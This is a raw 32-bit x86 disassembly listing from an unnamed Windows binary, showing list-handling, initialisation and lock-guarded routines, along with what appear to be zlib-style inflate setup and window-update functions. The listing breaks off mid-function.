   1b311:	lea    eax,[esi+0xc]
   1b314:	push   eax
   1b315:	push   DWORD PTR [ebp+0xc]
   1b318:	mov    ebx,esi
   1b31a:	call   0x19804
   1b31f:	test   al,al
   1b321:	je     0x1b327
   1b323:	mov    esi,DWORD PTR [esi]
   1b325:	jmp    0x1b32a
   1b327:	mov    esi,DWORD PTR [esi+0x8]
   1b32a:	cmp    esi,DWORD PTR ds:0x7f89c
   1b330:	jne    0x1b311
   1b332:	cmp    BYTE PTR [edi+0x8],0x0
   1b336:	je     0x1b353
   1b338:	push   DWORD PTR [ebp+0xc]
   1b33b:	lea    eax,[ebp+0xc]
   1b33e:	push   ebx
   1b33f:	push   esi
   1b340:	push   eax
   1b341:	mov    ecx,edi
   1b343:	call   0x1adb2
   1b348:	mov    ecx,DWORD PTR [eax]
   1b34a:	mov    eax,DWORD PTR [ebp+0x8]
   1b34d:	mov    BYTE PTR [eax+0x4],0x1
   1b351:	jmp    0x1b386
   1b353:	mov    DWORD PTR [ebp-0x4],ebx
   1b356:	test   al,al
   1b358:	je     0x1b369
   1b35a:	mov    eax,DWORD PTR [edi+0x4]
   1b35d:	cmp    ebx,DWORD PTR [eax]
   1b35f:	je     0x1b338
   1b361:	lea    ecx,[ebp-0x4]
   1b364:	call   0x1a5c2
   1b369:	push   DWORD PTR [ebp+0xc]
   1b36c:	mov    eax,DWORD PTR [ebp-0x4]
   1b36f:	add    eax,0xc
   1b372:	push   eax
   1b373:	call   0x19804
   1b378:	test   al,al
   1b37a:	jne    0x1b338
   1b37c:	mov    eax,DWORD PTR [ebp+0x8]
   1b37f:	mov    ecx,DWORD PTR [ebp-0x4]
   1b382:	mov    BYTE PTR [eax+0x4],0x0
   1b386:	pop    edi
   1b387:	pop    esi
   1b388:	mov    DWORD PTR [eax],ecx
   1b38a:	pop    ebx
   1b38b:	leave  
   1b38c:	ret    0x8
   1b38f:	int3   
   1b390:	int3   
   1b391:	int3   
   1b392:	int3   
   1b393:	int3   
   1b394:	mov    edi,edi
   1b396:	push   ebp
   1b397:	mov    ebp,esp
   1b399:	push   ecx
   1b39a:	push   ecx
   1b39b:	push   DWORD PTR [ebp+0x8]
   1b39e:	lea    eax,[ebp-0x8]
   1b3a1:	push   eax
   1b3a2:	call   0x1ad04
   1b3a7:	and    DWORD PTR [ebp+0x8],0x0
   1b3ab:	lea    eax,[ebp+0x8]
   1b3ae:	push   eax
   1b3af:	push   DWORD PTR [ebp-0x4]
   1b3b2:	push   DWORD PTR [ebp-0x8]
   1b3b5:	call   0x1aaae
   1b3ba:	mov    eax,DWORD PTR [ebp+0x8]
   1b3bd:	add    esp,0xc
   1b3c0:	leave  
   1b3c1:	ret    0x4
   1b3c4:	int3   
   1b3c5:	int3   
   1b3c6:	int3   
   1b3c7:	int3   
   1b3c8:	int3   
   1b3c9:	int3   
   1b3ca:	mov    edi,edi
   1b3cc:	push   ebp
   1b3cd:	mov    ebp,esp
   1b3cf:	push   ecx
   1b3d0:	push   esi
   1b3d1:	mov    esi,ecx
   1b3d3:	cmp    DWORD PTR [esi+0xc],0x0
   1b3d7:	mov    ecx,DWORD PTR [ebp+0xc]
   1b3da:	je     0x1b414
   1b3dc:	mov    eax,DWORD PTR [esi+0x4]
   1b3df:	cmp    ecx,DWORD PTR [eax]
   1b3e1:	jne    0x1b414
   1b3e3:	cmp    DWORD PTR [ebp+0x10],eax
   1b3e6:	jne    0x1b414
   1b3e8:	push   DWORD PTR [eax+0x4]
   1b3eb:	mov    ecx,esi
   1b3ed:	call   0x1b186
   1b3f2:	mov    ecx,DWORD PTR ds:0x7f89c
   1b3f8:	mov    eax,DWORD PTR [esi+0x4]
   1b3fb:	mov    DWORD PTR [eax+0x4],ecx
   1b3fe:	mov    eax,DWORD PTR [esi+0x4]
   1b401:	and    DWORD PTR [esi+0xc],0x0
   1b405:	mov    DWORD PTR [eax],eax
   1b407:	mov    eax,DWORD PTR [esi+0x4]
   1b40a:	mov    DWORD PTR [eax+0x8],eax
   1b40d:	mov    eax,DWORD PTR [esi+0x4]
   1b410:	mov    ecx,DWORD PTR [eax]
   1b412:	jmp    0x1b439
   1b414:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b417:	je     0x1b439
   1b419:	push   edi
   1b41a:	mov    edi,ecx
   1b41c:	lea    ecx,[ebp+0xc]
   1b41f:	call   0x1a3d2
   1b424:	push   edi
   1b425:	lea    eax,[ebp-0x4]
   1b428:	push   eax
   1b429:	mov    ecx,esi
   1b42b:	call   0x1af08
   1b430:	mov    ecx,DWORD PTR [ebp+0xc]
   1b433:	cmp    ecx,DWORD PTR [ebp+0x10]
   1b436:	jne    0x1b41a
   1b438:	pop    edi
   1b439:	mov    eax,DWORD PTR [ebp+0x8]
   1b43c:	mov    DWORD PTR [eax],ecx
   1b43e:	pop    esi
   1b43f:	leave  
   1b440:	ret    0xc
   1b443:	int3   
   1b444:	int3   
   1b445:	int3   
   1b446:	int3   
   1b447:	int3   
   1b448:	mov    edi,edi
   1b44a:	push   ebp
   1b44b:	mov    ebp,esp
   1b44d:	push   esi
   1b44e:	push   DWORD PTR [ebp+0x8]
   1b451:	mov    esi,ecx
   1b453:	mov    ecx,DWORD PTR [esi]
   1b455:	call   0x1b1ec
   1b45a:	mov    eax,esi
   1b45c:	pop    esi
   1b45d:	pop    ebp
   1b45e:	ret    0x4
   1b461:	int3   
   1b462:	int3   
   1b463:	int3   
   1b464:	int3   
   1b465:	int3   
   1b466:	mov    edi,edi
   1b468:	push   ebp
   1b469:	mov    ebp,esp
   1b46b:	push   ecx
   1b46c:	push   esi
   1b46d:	push   edi
   1b46e:	xor    edi,edi
   1b470:	push   edi
   1b471:	push   edi
   1b472:	push   edi
   1b473:	push   edi
   1b474:	mov    esi,0x7f86c
   1b479:	push   esi
   1b47a:	call   DWORD PTR ds:0x1f028
   1b480:	test   eax,eax
   1b482:	jl     0x1b4a6
   1b484:	mov    eax,ds:0x7f898
   1b489:	mov    ecx,DWORD PTR ds:0x7f890
   1b48f:	add    eax,0x9
   1b492:	mov    DWORD PTR [ebp-0x4],eax
   1b495:	lea    eax,[ebp-0x4]
   1b498:	push   eax
   1b499:	call   0x1b2dc
   1b49e:	push   edi
   1b49f:	push   esi
   1b4a0:	call   DWORD PTR ds:0x1f024
   1b4a6:	pop    edi
   1b4a7:	pop    esi
   1b4a8:	leave  
   1b4a9:	ret    
   1b4aa:	int3   
   1b4ab:	int3   
   1b4ac:	int3   
   1b4ad:	int3   
   1b4ae:	int3   
   1b4af:	int3   
   1b4b0:	mov    edi,edi
   1b4b2:	push   ebp
   1b4b3:	mov    ebp,esp
   1b4b5:	push   ecx
   1b4b6:	push   ecx
   1b4b7:	push   DWORD PTR [ebp+0xc]
   1b4ba:	lea    eax,[ebp-0x8]
   1b4bd:	push   eax
   1b4be:	call   0x1b2fa
   1b4c3:	mov    eax,DWORD PTR [ebp+0x8]
   1b4c6:	mov    ecx,DWORD PTR [ebp-0x8]
   1b4c9:	mov    DWORD PTR [eax],ecx
   1b4cb:	mov    cl,BYTE PTR [ebp-0x4]
   1b4ce:	mov    BYTE PTR [eax+0x4],cl
   1b4d1:	leave  
   1b4d2:	ret    0x8
   1b4d5:	int3   
   1b4d6:	int3   
   1b4d7:	int3   
   1b4d8:	int3   
   1b4d9:	int3   
   1b4da:	mov    edi,edi
   1b4dc:	push   ebp
   1b4dd:	mov    ebp,esp
   1b4df:	push   ecx
   1b4e0:	push   ecx
   1b4e1:	push   esi
   1b4e2:	push   DWORD PTR [ebp+0x8]
   1b4e5:	lea    eax,[ebp-0x8]
   1b4e8:	push   eax
   1b4e9:	mov    esi,ecx
   1b4eb:	call   0x1ad04
   1b4f0:	and    DWORD PTR [ebp+0x8],0x0
   1b4f4:	lea    eax,[ebp+0x8]
   1b4f7:	push   eax
   1b4f8:	push   DWORD PTR [ebp-0x4]
   1b4fb:	push   DWORD PTR [ebp-0x8]
   1b4fe:	call   0x1aaae
   1b503:	add    esp,0xc
   1b506:	push   DWORD PTR [ebp-0x4]
   1b509:	lea    eax,[ebp-0x4]
   1b50c:	push   DWORD PTR [ebp-0x8]
   1b50f:	mov    ecx,esi
   1b511:	push   eax
   1b512:	call   0x1b3ca
   1b517:	mov    eax,DWORD PTR [ebp+0x8]
   1b51a:	pop    esi
   1b51b:	leave  
   1b51c:	ret    0x4
   1b51f:	int3   
   1b520:	int3   
   1b521:	int3   
   1b522:	int3   
   1b523:	int3   
   1b524:	mov    edi,edi
   1b526:	push   ebp
   1b527:	mov    ebp,esp
   1b529:	jmp    0x1b53c
   1b52b:	push   eax
   1b52c:	lea    ecx,[ebp+0x2c]
   1b52f:	call   0x1b448
   1b534:	lea    ecx,[ebp+0xc]
   1b537:	call   0x1a334
   1b53c:	mov    eax,DWORD PTR [ebp+0x14]
   1b53f:	cmp    eax,DWORD PTR [ebp+0x24]
   1b542:	jne    0x1b52b
   1b544:	mov    eax,DWORD PTR [ebp+0x8]
   1b547:	mov    ecx,DWORD PTR [ebp+0x2c]
   1b54a:	mov    DWORD PTR [eax],ecx
   1b54c:	pop    ebp
   1b54d:	ret    0x28
   1b550:	int3   
   1b551:	int3   
   1b552:	int3   
   1b553:	int3   
   1b554:	int3   
   1b555:	int3   
   1b556:	mov    edi,edi
   1b558:	push   ebp
   1b559:	mov    ebp,esp
   1b55b:	sub    esp,0x10
   1b55e:	push   0xffffffff
   1b560:	push   DWORD PTR [ebp+0x8]
   1b563:	lea    ecx,[ebp-0x8]
   1b566:	call   0x110ae
   1b56b:	mov    ecx,DWORD PTR ds:0x7f88c
   1b571:	lea    eax,[ebp-0x8]
   1b574:	push   eax
   1b575:	lea    eax,[ebp-0x10]
   1b578:	push   eax
   1b579:	call   0x1b4b0
   1b57e:	push   DWORD PTR [ebp-0x8]
   1b581:	call   0x10a9a
   1b586:	pop    ecx
   1b587:	leave  
   1b588:	ret    0x4
   1b58b:	int3   
   1b58c:	int3   
   1b58d:	int3   
   1b58e:	int3   
   1b58f:	int3   
   1b590:	mov    edi,edi
   1b592:	push   ebp
   1b593:	mov    ebp,esp
   1b595:	xor    eax,eax
   1b597:	push   ebx
   1b598:	push   esi
   1b599:	push   edi
   1b59a:	mov    ebx,ecx
   1b59c:	mov    DWORD PTR [ebx+0x4],eax
   1b59f:	mov    DWORD PTR [ebx+0x8],eax
   1b5a2:	mov    DWORD PTR [ebx+0xc],eax
   1b5a5:	mov    DWORD PTR [ebx+0x10],eax
   1b5a8:	mov    DWORD PTR [ebx+0x14],eax
   1b5ab:	mov    DWORD PTR [ebx+0x18],eax
   1b5ae:	mov    DWORD PTR [ebx+0x1c],eax
   1b5b1:	mov    DWORD PTR [ebx+0x20],eax
   1b5b4:	mov    DWORD PTR [ebx+0x24],eax
   1b5b7:	mov    DWORD PTR [ebx+0x28],eax
   1b5ba:	mov    DWORD PTR [ebx+0x2c],eax
   1b5bd:	mov    eax,DWORD PTR [ebp+0x8]
   1b5c0:	push   ebx
   1b5c1:	sub    esp,0x10
   1b5c4:	mov    edi,esp
   1b5c6:	lea    esi,[eax+0x14]
   1b5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5cd:	sub    esp,0x10
   1b5d0:	lea    esi,[eax+0x4]
   1b5d3:	mov    edi,esp
   1b5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5d8:	lea    eax,[ebp+0x8]
   1b5db:	push   eax
   1b5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b5dd:	call   0x1b524
   1b5e2:	pop    edi
   1b5e3:	pop    esi
   1b5e4:	mov    eax,ebx
   1b5e6:	pop    ebx
   1b5e7:	pop    ebp
   1b5e8:	ret    0x4
   1b5eb:	int3   
   1b5ec:	int3   
   1b5ed:	int3   
   1b5ee:	int3   
   1b5ef:	int3   
   1b5f0:	mov    edi,edi
   1b5f2:	push   ebp
   1b5f3:	mov    ebp,esp
   1b5f5:	push   ecx
   1b5f6:	push   ebx
   1b5f7:	push   0x30
   1b5f9:	call   0x10a66
   1b5fe:	xor    ebx,ebx
   1b600:	pop    ecx
   1b601:	cmp    eax,ebx
   1b603:	je     0x1b617
   1b605:	lea    ecx,[ebp-0x1]
   1b608:	push   ecx
   1b609:	mov    ecx,eax
   1b60b:	call   0x1a4d6
   1b610:	mov    ds:0x7f894,eax
   1b615:	jmp    0x1b61d
   1b617:	mov    DWORD PTR ds:0x7f894,ebx
   1b61d:	push   esi
   1b61e:	push   0x10
   1b620:	call   0x10a66
   1b625:	mov    esi,eax
   1b627:	pop    ecx
   1b628:	cmp    esi,ebx
   1b62a:	je     0x1b63e
   1b62c:	mov    ecx,esi
   1b62e:	mov    BYTE PTR [esi+0x8],bl
   1b631:	call   0x1ad36
   1b636:	mov    DWORD PTR ds:0x7f88c,esi
   1b63c:	jmp    0x1b644
   1b63e:	mov    DWORD PTR ds:0x7f88c,ebx
   1b644:	push   0xc
   1b646:	call   0x10a66
   1b64b:	pop    ecx
   1b64c:	pop    esi
   1b64d:	cmp    eax,ebx
   1b64f:	je     0x1b663
   1b651:	lea    ecx,[ebp-0x1]
   1b654:	push   ecx
   1b655:	mov    ecx,eax
   1b657:	call   0x1ab4a
   1b65c:	mov    ds:0x7f890,eax
   1b661:	jmp    0x1b669
   1b663:	mov    DWORD PTR ds:0x7f890,ebx
   1b669:	push   ebx
   1b66a:	push   0x7f86c
   1b66f:	call   0x11c32
   1b674:	call   eax
   1b676:	mov    DWORD PTR ds:0x7f898,0x1
   1b680:	pop    ebx
   1b681:	leave  
   1b682:	ret    
   1b683:	int3   
   1b684:	int3   
   1b685:	int3   
   1b686:	int3   
   1b687:	int3   
   1b688:	push   0x3c
   1b68a:	push   0x7e0d0
   1b68f:	call   0x1db1c
   1b694:	xor    esi,esi
   1b696:	push   esi
   1b697:	push   esi
   1b698:	push   esi
   1b699:	push   esi
   1b69a:	push   0x7f86c
   1b69f:	call   DWORD PTR ds:0x1f028
   1b6a5:	cmp    eax,esi
   1b6a7:	jl     0x1b817
   1b6ad:	mov    DWORD PTR [ebp-0x4],esi
   1b6b0:	mov    edi,DWORD PTR [ebp+0x8]
   1b6b3:	push   edi
   1b6b4:	lea    eax,[ebp-0x24]
   1b6b7:	push   eax
   1b6b8:	call   0x1a6e2
   1b6bd:	cmp    DWORD PTR [eax+0x4],esi
   1b6c0:	setne  BYTE PTR [ebp-0x19]
   1b6c4:	push   DWORD PTR [ebp-0x24]
   1b6c7:	call   0x10a9a
   1b6cc:	pop    ecx
   1b6cd:	push   edi
   1b6ce:	lea    eax,[ebp-0x2c]
   1b6d1:	push   eax
   1b6d2:	call   0x1a708
   1b6d7:	xor    al,al
   1b6d9:	cmp    DWORD PTR [edi+0x14],esi
   1b6dc:	jne    0x1b6f2
   1b6de:	lea    eax,[ebp-0x2c]
   1b6e1:	push   eax
   1b6e2:	mov    ecx,DWORD PTR ds:0x7f88c
   1b6e8:	call   0x1b394
   1b6ed:	test   eax,eax
   1b6ef:	setne  al
   1b6f2:	test   al,al
   1b6f4:	je     0x1b705
   1b6f6:	lea    eax,[ebp-0x2c]
   1b6f9:	push   eax
   1b6fa:	mov    ecx,DWORD PTR ds:0x7f88c
   1b700:	call   0x1b4da
   1b705:	mov    ebx,DWORD PTR ds:0x7f894
   1b70b:	cmp    DWORD PTR [ebx+0x2c],esi
   1b70e:	jbe    0x1b76e
   1b710:	mov    eax,ds:0x7ed34
   1b715:	mov    DWORD PTR [ebp-0x20],eax
   1b718:	cmp    eax,esi
   1b71a:	ja     0x1b723
   1b71c:	mov    DWORD PTR [ebp-0x20],0x1
   1b723:	mov    eax,DWORD PTR [ebp-0x20]
   1b726:	cmp    DWORD PTR [ebx+0x2c],eax
   1b729:	jb     0x1b76e
   1b72b:	lea    esi,[ebx+0x4]
   1b72e:	lea    edi,[ebp-0x3c]
   1b731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b733:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b735:	mov    eax,DWORD PTR [ebp-0x34]
   1b738:	mov    eax,DWORD PTR [eax]
   1b73a:	mov    eax,DWORD PTR [eax+0xc]
   1b73d:	xor    ecx,ecx
   1b73f:	add    eax,0x9c40
   1b744:	push   ecx
   1b745:	pop    esi
   1b746:	adc    ecx,esi
   1b748:	mov    edx,DWORD PTR [ebp+0x8]
   1b74b:	mov    edx,DWORD PTR [edx+0xc]
   1b74e:	cmp    ecx,esi
   1b750:	ja     0x1b76e
   1b752:	jb     0x1b758
   1b754:	cmp    eax,edx
   1b756:	jae    0x1b76e
   1b758:	mov    ecx,ebx
   1b75a:	call   0x1a504
   1b75f:	mov    ecx,ebx
   1b761:	call   0x1ab2e
   1b766:	mov    ebx,DWORD PTR ds:0x7f894
   1b76c:	jmp    0x1b723
   1b76e:	push   DWORD PTR [ebp+0x8]
   1b771:	lea    eax,[ebp-0x24]
   1b774:	push   eax
   1b775:	call   0x1a708
   1b77a:	push   eax
   1b77b:	lea    eax,[ebp-0x3c]
   1b77e:	push   eax
   1b77f:	call   0x1a754
   1b784:	push   DWORD PTR [ebp-0x24]
   1b787:	call   0x10a9a
   1b78c:	pop    ecx
   1b78d:	mov    ebx,DWORD PTR ds:0x7f894
   1b793:	lea    esi,[ebx+0x14]
   1b796:	lea    edi,[ebp-0x4c]
   1b799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b79b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1b79d:	mov    esi,DWORD PTR [ebp-0x34]
   1b7a0:	cmp    esi,DWORD PTR [ebp-0x44]
   1b7a3:	je     0x1b7d7
   1b7a5:	mov    eax,DWORD PTR [esi]
   1b7a7:	mov    BYTE PTR [eax+0x1c],0x0
   1b7ab:	mov    eax,DWORD PTR [esi]
   1b7ad:	cmp    BYTE PTR [eax+0x24],0x0
   1b7b1:	jne    0x1b7c1
   1b7b3:	mov    BYTE PTR [eax+0x24],0x1
   1b7b7:	mov    eax,DWORD PTR [esi]
   1b7b9:	push   DWORD PTR [eax+0x8]
   1b7bc:	call   0x1a47e
   1b7c1:	mov    eax,DWORD PTR [esi]
   1b7c3:	mov    ecx,DWORD PTR [eax+0x8]
   1b7c6:	mov    eax,DWORD PTR [ebp+0x8]
   1b7c9:	mov    DWORD PTR [eax+0x8],ecx
   1b7cc:	mov    ecx,DWORD PTR [esi]
   1b7ce:	mov    ecx,DWORD PTR [ecx+0x20]
   1b7d1:	inc    ecx
   1b7d2:	mov    DWORD PTR [eax+0x20],ecx
   1b7d5:	jmp    0x1b7da
   1b7d7:	mov    eax,DWORD PTR [ebp+0x8]
   1b7da:	mov    cl,BYTE PTR [ebp-0x19]
   1b7dd:	mov    BYTE PTR [eax+0x1c],cl
   1b7e0:	lea    eax,[ebp+0x8]
   1b7e3:	push   eax
   1b7e4:	mov    ecx,ebx
   1b7e6:	call   0x1b1ec
   1b7eb:	inc    DWORD PTR ds:0x7f898
   1b7f1:	push   DWORD PTR [ebp-0x2c]
   1b7f4:	call   0x10a9a
   1b7f9:	pop    ecx
   1b7fa:	jmp    0x1b803
   1b7fc:	xor    eax,eax
   1b7fe:	inc    eax
   1b7ff:	ret    
   1b800:	mov    esp,DWORD PTR [ebp-0x18]
   1b803:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b80a:	push   0x0
   1b80c:	push   0x7f86c
   1b811:	call   DWORD PTR ds:0x1f024
   1b817:	call   0x1db61
   1b81c:	ret    0x4
   1b81f:	int3   
   1b820:	int3   
   1b821:	int3   
   1b822:	int3   
   1b823:	int3   
   1b824:	push   0x48
   1b826:	push   0x7e0f0
   1b82b:	call   0x1db1c
   1b830:	xor    ebx,ebx
   1b832:	push   ebx
   1b833:	push   ebx
   1b834:	push   ebx
   1b835:	push   ebx
   1b836:	push   0x7f86c
   1b83b:	call   DWORD PTR ds:0x1f028
   1b841:	cmp    eax,ebx
   1b843:	jl     0x1b8f1
   1b849:	mov    DWORD PTR [ebp-0x4],ebx
   1b84c:	push   DWORD PTR ds:0x7f890
   1b852:	lea    ecx,[ebp-0x28]
   1b855:	call   0x1b246
   1b85a:	mov    BYTE PTR [ebp-0x19],bl
   1b85d:	cmp    DWORD PTR [ebp-0x20],ebx
   1b860:	je     0x1b880
   1b862:	mov    eax,DWORD PTR [ebp-0x24]
   1b865:	mov    eax,DWORD PTR [eax]
   1b867:	mov    eax,DWORD PTR [eax+0x8]
   1b86a:	cmp    eax,DWORD PTR ds:0x7f898
   1b870:	ja     0x1b880
   1b872:	mov    BYTE PTR [ebp-0x19],0x1
   1b876:	lea    ecx,[ebp-0x28]
   1b879:	call   0x1aba4
   1b87e:	jmp    0x1b85d
   1b880:	cmp    BYTE PTR [ebp-0x19],bl
   1b883:	je     0x1b8bb
   1b885:	push   DWORD PTR ds:0x7f894
   1b88b:	lea    ecx,[ebp-0x58]
   1b88e:	call   0x1b590
   1b893:	mov    esi,DWORD PTR [ebp+0x8]
   1b896:	push   esi
   1b897:	lea    eax,[ebp-0x58]
   1b89a:	push   eax
   1b89b:	call   0x1a7f2
   1b8a0:	cmp    DWORD PTR [esi],ebx
   1b8a2:	jne    0x1b8b3
   1b8a4:	lea    eax,[ebp-0x28]
   1b8a7:	push   eax
   1b8a8:	mov    ecx,DWORD PTR ds:0x7f890
   1b8ae:	call   0x1b284
   1b8b3:	lea    ecx,[ebp-0x58]
   1b8b6:	call   0x1b1d0
   1b8bb:	lea    ecx,[ebp-0x28]
   1b8be:	call   0x1ab70
   1b8c3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b8ca:	jmp    0x1b8e5
   1b8cc:	xor    eax,eax
   1b8ce:	inc    eax
   1b8cf:	ret    
   1b8d0:	mov    esp,DWORD PTR [ebp-0x18]
   1b8d3:	mov    eax,DWORD PTR [ebp+0x8]
   1b8d6:	mov    DWORD PTR [eax],0x2
   1b8dc:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1b8e3:	xor    ebx,ebx
   1b8e5:	push   ebx
   1b8e6:	push   0x7f86c
   1b8eb:	call   DWORD PTR ds:0x1f024
   1b8f1:	call   0x1db61
   1b8f6:	ret    0x4
   1b8f9:	int3   
   1b8fa:	int3   
   1b8fb:	int3   
   1b8fc:	int3   
   1b8fd:	int3   
   1b8fe:	mov    edi,edi
   1b900:	push   ebp
   1b901:	mov    ebp,esp
   1b903:	mov    ecx,DWORD PTR [ebp+0x8]
   1b906:	xor    edx,edx
   1b908:	cmp    ecx,edx
   1b90a:	je     0x1b95a
   1b90c:	mov    eax,DWORD PTR [ecx+0x1c]
   1b90f:	cmp    eax,edx
   1b911:	je     0x1b95a
   1b913:	mov    DWORD PTR [eax+0x1c],edx
   1b916:	mov    DWORD PTR [ecx+0x14],edx
   1b919:	mov    DWORD PTR [ecx+0x8],edx
   1b91c:	mov    DWORD PTR [ecx+0x18],edx
   1b91f:	mov    DWORD PTR [ecx+0x30],0x1
   1b926:	lea    ecx,[eax+0x530]
   1b92c:	mov    DWORD PTR [eax],edx
   1b92e:	mov    DWORD PTR [eax+0x4],edx
   1b931:	mov    DWORD PTR [eax+0xc],edx
   1b934:	mov    DWORD PTR [eax+0x14],0x8000
   1b93b:	mov    DWORD PTR [eax+0x20],edx
   1b93e:	mov    DWORD PTR [eax+0x28],edx
   1b941:	mov    DWORD PTR [eax+0x2c],edx
   1b944:	mov    DWORD PTR [eax+0x30],edx
   1b947:	mov    DWORD PTR [eax+0x38],edx
   1b94a:	mov    DWORD PTR [eax+0x3c],edx
   1b94d:	mov    DWORD PTR [eax+0x6c],ecx
   1b950:	mov    DWORD PTR [eax+0x50],ecx
   1b953:	mov    DWORD PTR [eax+0x4c],ecx
   1b956:	xor    eax,eax
   1b958:	jmp    0x1b95d
   1b95a:	push   0xfffffffe
   1b95c:	pop    eax
   1b95d:	pop    ebp
   1b95e:	ret    0x4
   1b961:	int3   
   1b962:	int3   
   1b963:	int3   
   1b964:	int3   
   1b965:	int3   
   1b966:	mov    edi,edi
   1b968:	push   ebp
   1b969:	mov    ebp,esp
   1b96b:	mov    eax,DWORD PTR [ebp+0x10]
   1b96e:	push   esi
   1b96f:	push   edi
   1b970:	xor    edi,edi
   1b972:	cmp    eax,edi
   1b974:	je     0x1ba0f
   1b97a:	cmp    BYTE PTR [eax],0x31
   1b97d:	jne    0x1ba0f
   1b983:	cmp    DWORD PTR [ebp+0x14],0x38
   1b987:	jne    0x1ba0f
   1b98d:	mov    esi,DWORD PTR [ebp+0x8]
   1b990:	cmp    esi,edi
   1b992:	jne    0x1b998
   1b994:	push   0xfffffffe
   1b996:	jmp    0x1ba11
   1b998:	mov    DWORD PTR [esi+0x18],edi
   1b99b:	cmp    DWORD PTR [esi+0x20],edi
   1b99e:	jne    0x1b9aa
   1b9a0:	mov    DWORD PTR [esi+0x20],0x1cd66
   1b9a7:	mov    DWORD PTR [esi+0x28],edi
   1b9aa:	cmp    DWORD PTR [esi+0x24],edi
   1b9ad:	jne    0x1b9b6
   1b9af:	mov    DWORD PTR [esi+0x24],0x1cd82
   1b9b6:	push   0x2530
   1b9bb:	push   0x1
   1b9bd:	push   DWORD PTR [esi+0x28]
   1b9c0:	call   DWORD PTR [esi+0x20]
   1b9c3:	cmp    eax,edi
   1b9c5:	jne    0x1b9cb
   1b9c7:	push   0xfffffffc
   1b9c9:	jmp    0x1ba11
   1b9cb:	mov    ecx,DWORD PTR [ebp+0xc]
   1b9ce:	cmp    ecx,edi
   1b9d0:	mov    DWORD PTR [esi+0x1c],eax
   1b9d3:	jge    0x1b9dc
   1b9d5:	mov    DWORD PTR [eax+0x8],edi
   1b9d8:	neg    ecx
   1b9da:	jmp    0x1b9ed
   1b9dc:	mov    edx,ecx
   1b9de:	sar    edx,0x4
   1b9e1:	inc    edx
   1b9e2:	cmp    ecx,0x30
   1b9e5:	mov    DWORD PTR [eax+0x8],edx
   1b9e8:	jge    0x1b9ed
   1b9ea:	and    ecx,0xf
   1b9ed:	lea    edx,[ecx-0x8]
   1b9f0:	cmp    edx,0x7
   1b9f3:	ja     0x1ba03
   1b9f5:	push   esi
   1b9f6:	mov    DWORD PTR [eax+0x24],ecx
   1b9f9:	mov    DWORD PTR [eax+0x34],edi
   1b9fc:	call   0x1b8fe
   1ba01:	jmp    0x1ba12
   1ba03:	push   eax
   1ba04:	push   DWORD PTR [esi+0x28]
   1ba07:	call   DWORD PTR [esi+0x24]
   1ba0a:	mov    DWORD PTR [esi+0x1c],edi
   1ba0d:	jmp    0x1b994
   1ba0f:	push   0xfffffffa
   1ba11:	pop    eax
   1ba12:	pop    edi
   1ba13:	pop    esi
   1ba14:	pop    ebp
   1ba15:	ret    0x10
   1ba18:	int3   
   1ba19:	int3   
   1ba1a:	int3   
   1ba1b:	int3   
   1ba1c:	int3   
   1ba1d:	int3   
   1ba1e:	mov    edi,edi
   1ba20:	push   ebp
   1ba21:	mov    ebp,esp
   1ba23:	push   ecx
   1ba24:	push   ebx
   1ba25:	push   esi
   1ba26:	mov    esi,DWORD PTR [edi+0x1c]
   1ba29:	cmp    DWORD PTR [esi+0x34],0x0
   1ba2d:	mov    ebx,eax
   1ba2f:	jne    0x1ba4f
   1ba31:	mov    ecx,DWORD PTR [esi+0x24]
   1ba34:	xor    eax,eax
   1ba36:	inc    eax
   1ba37:	shl    eax,cl
   1ba39:	push   0x1
   1ba3b:	push   eax
   1ba3c:	push   DWORD PTR [edi+0x28]
   1ba3f:	call   DWORD PTR [edi+0x20]
   1ba42:	mov    DWORD PTR [esi+0x34],eax
   1ba45:	test   eax,eax
   1ba47:	jne    0x1ba4f
   1ba49:	inc    eax
   1ba4a:	jmp    0x1baf1
   1ba4f:	xor    eax,eax
   1ba51:	cmp    DWORD PTR [esi+0x28],eax
   1ba54:	jne    0x1ba67
   1ba56:	mov    ecx,DWORD PTR [esi+0x24]
   1ba59:	xor    edx,edx
   1ba5b:	inc    edx
   1ba5c:	shl    edx,cl
   1ba5e:	mov    DWORD PTR [esi+0x30],eax
   1ba61:	mov    DWORD PTR [esi+0x2c],eax
   1ba64:	mov    DWORD PTR [esi+0x28],edx
   1ba67:	sub    ebx,DWORD PTR [edi+0x10]
   1ba6a:	mov    eax,DWORD PTR [esi+0x28]
   1ba6d:	cmp    ebx,eax
   1ba6f:	jb     0x1ba89
   1ba71:	mov    ecx,DWORD PTR [edi+0xc]
   1ba74:	push   eax
   1ba75:	sub    ecx,eax
   1ba77:	push   ecx
   1ba78:	push   DWORD PTR [esi+0x34]
   1ba7b:	call   0x1dade
   1ba80:	add    esp,0xc
   1ba83:	and    DWORD PTR [esi+0x30],0x0
   1ba87:	jmp    0x1baca
   1ba89:	sub    eax,DWORD PTR [esi+0x30]
   1ba8c:	mov    DWORD PTR [ebp-0x4],eax
   1ba8f:	cmp    eax,ebx
   1ba91:	jbe    0x1ba96
   1ba93:	mov    DWORD PTR [ebp-0x4],ebx
   1ba96:	mov    eax,DWORD PTR [edi+0xc]
   1ba99:	push   DWORD PTR [ebp-0x4]
   1ba9c:	sub    eax,ebx
